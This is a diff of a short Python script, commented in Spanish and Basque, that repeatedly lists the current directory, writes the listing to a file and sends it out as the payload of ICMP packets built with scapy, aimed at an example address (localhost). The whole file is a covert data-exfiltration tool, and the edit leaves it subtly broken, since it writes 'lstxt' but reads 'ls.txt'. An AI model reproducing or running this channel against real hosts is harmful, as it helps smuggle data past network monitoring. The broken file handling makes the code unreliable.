@@ -1,7 +1,3 @@
-#asko borobiltzeke eta pip, DockeFilera
-pip install scapy
-
-
 import subprocess
 import time
 from scapy.all import *
@@ -10,19 +6,19 @@ from scapy.all import *
 destination = "127.0.0.1"  # Por ejemplo, localhost
 
 while True:
-    # Ejecutar el comando tree y guardar el resultado en tree.txt
+    # Ejecutar el comando ls y guardar el resultado en ls.txt  
     try:
-        result = subprocess.check_output(['tree'], text=True)
-        with open("tree.txt", "w") as file:
+        result = subprocess.check_output(['ls'], text=True)
+        with open("lstxt", "w") as file:
             file.write(result)
     except Exception as e:
-        print(f"Error al ejecutar el comando tree: {e}")
+        print(f"Error al ejecutar el comando ls: {e}")
         time.sleep(300)  # Espera 5 minutos y vuelve a intentar
         continue
 
     # Leer el contenido del archivo y enviar como payload en paquetes ICMP
     try:
-        with open("tree.txt", "r") as file:
+        with open("ls.txt", "r") as file:
             payload = file.read()
 
         # Limitar el tamaño del payload si es necesario
@@ -37,5 +33,5 @@ while True:
     except Exception as e:
         print(f"Error al enviar el payload: {e}")
 
-    # Esperar 5 minutos
-    time.sleep(300)
+    # 30 sg itxaron
+    time.sleep(30)
